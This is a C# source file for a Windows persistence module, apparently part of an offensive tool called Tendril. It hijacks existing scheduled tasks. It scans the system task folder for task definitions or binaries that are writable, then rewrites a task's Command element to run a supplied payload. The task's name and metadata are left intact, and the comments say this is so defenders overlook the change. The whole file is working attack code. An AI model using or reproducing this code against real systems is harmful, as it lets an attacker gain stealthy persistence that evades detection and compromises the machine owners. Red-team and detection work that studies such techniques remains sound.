using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Scheduled Task Hijack (T1053.005)
    ///
    /// Instead of creating a new task (noisy), hijack an existing legitimate task
    /// by rewriting its Action to point at the payload. The task name, author,
    /// triggers, and metadata stay intact - defenders see a familiar task name
    /// running an unfamiliar binary.
    ///
    /// Check mode finds tasks whose XML definition file or binary is writable.
    /// Install mode overwrites the Command element in the task XML and optionally
    /// calls schtasks to re-register it.
    ///
    /// Drawn from SharpUp's ModifiableScheduledTaskFile + HackTricks 2026 research
    /// on rewriting existing updater tasks.
    /// </summary>
    public class ScheduledTaskHijack : ITendril
    {
        public string Name { get { return "ScheduledTaskHijack"; } }
        public string Description { get { return "Hijack existing scheduled task - rewrite action, keep metadata"; } }
        public string MitreId { get { return "T1053.005"; } }
        public bool RequiresAdmin { get { return false; } }
        public bool IsReconOnly { get { return false; } }

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string taskFile, payload, arguments;
            if (!options.TryGetValue("taskfile", out taskFile))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Missing required option: /taskfile:<path_to_task_xml> (from 'check' output)");

            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<new_command>");

            if (!options.TryGetValue("arguments", out arguments))
                arguments = null;

            try
            {
                // Back up original
                string backup = taskFile + ".tendril.bak";
                if (!File.Exists(backup))
                    File.Copy(taskFile, backup, false);

                XmlDocument doc = new XmlDocument();
                doc.Load(taskFile);

                // Handle namespace (task XML uses a default namespace)
                XmlNamespaceManager ns = new XmlNamespaceManager(doc.NameTable);
                string nsUri = doc.DocumentElement.NamespaceURI;
                if (!string.IsNullOrEmpty(nsUri))
                    ns.AddNamespace("t", nsUri);

                // Find and replace Command element
                string prefix = string.IsNullOrEmpty(nsUri) ? "" : "t:";
                XmlNodeList commands = doc.GetElementsByTagName("Command");
                if (commands.Count == 0)
                    return new TendrilResult(ResultStatus.Failed, Name, "No <Command> element found in task XML");

                string originalCmd = commands[0].InnerText;
                commands[0].InnerText = payload;

                // Optionally set Arguments
                if (arguments != null)
                {
                    XmlNodeList argNodes = doc.GetElementsByTagName("Arguments");
                    if (argNodes.Count > 0)
                        argNodes[0].InnerText = arguments;
                }

                doc.Save(taskFile);

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("Task hijacked: {0}", Path.GetFileName(taskFile)))
                    .WithMeta("TaskFile", taskFile)
                    .WithMeta("OriginalCommand", originalCmd)
                    .WithMeta("NewCommand", payload)
                    .WithMeta("Backup", backup);
            }
            catch (Exception ex)
            {
                return new TendrilResult(ResultStatus.Failed, Name, "Hijack failed: " + ex.Message);
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string taskFile;
            if (!options.TryGetValue("taskfile", out taskFile))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing /taskfile:<path>");

            string backup = taskFile + ".tendril.bak";
            if (File.Exists(backup))
            {
                File.Copy(backup, taskFile, true);
                File.Delete(backup);
                return new TendrilResult(ResultStatus.Success, Name, "Task XML restored from backup");
            }
            return new TendrilResult(ResultStatus.Warning, Name, "No backup file found");
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            try
            {
                string tasksDir = Path.Combine(
                    Environment.GetEnvironmentVariable("SystemRoot"),
                    IntPtr.Size == 8 ? @"System32\Tasks" : @"SysWOW64\Tasks");

                ScanTaskDirectory(tasksDir, results);
            }
            catch (Exception ex)
            {
                results.Add(new TendrilResult(ResultStatus.Failed, Name,
                    "Task enumeration failed: " + ex.Message));
            }

            return results;
        }

        private void ScanTaskDirectory(string dir, List<TendrilResult> results)
        {
            if (!Directory.Exists(dir)) return;

            try
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    try
                    {
                        bool xmlWritable = FileUtils.IsWritable(file);

                        XmlDocument doc = new XmlDocument();
                        doc.Load(file);

                        XmlNodeList uris = doc.GetElementsByTagName("URI");
                        XmlNodeList commands = doc.GetElementsByTagName("Command");

                        for (int i = 0; i < commands.Count; i++)
                        {
                            string cmd = commands[i].InnerText;
                            bool binWritable = FileUtils.IsWritable(cmd);

                            if (xmlWritable || binWritable)
                            {
                                string taskName = uris.Count > 0 ? uris[0].InnerText : Path.GetFileName(file);

                                results.Add(new TendrilResult(ResultStatus.Warning, Name,
                                    string.Format("Hijackable task: {0}", taskName))
                                    .WithMeta("TaskName", taskName)
                                    .WithMeta("TaskFile", file)
                                    .WithMeta("Command", cmd)
                                    .WithMeta("XmlWritable", xmlWritable.ToString())
                                    .WithMeta("BinaryWritable", binWritable.ToString()));
                            }
                        }
                    }
                    catch { continue; }
                }

                // Recurse into subdirectories
                foreach (string subdir in Directory.GetDirectories(dir))
                    ScanTaskDirectory(subdir, results);
            }
            catch { }
        }
    }
}
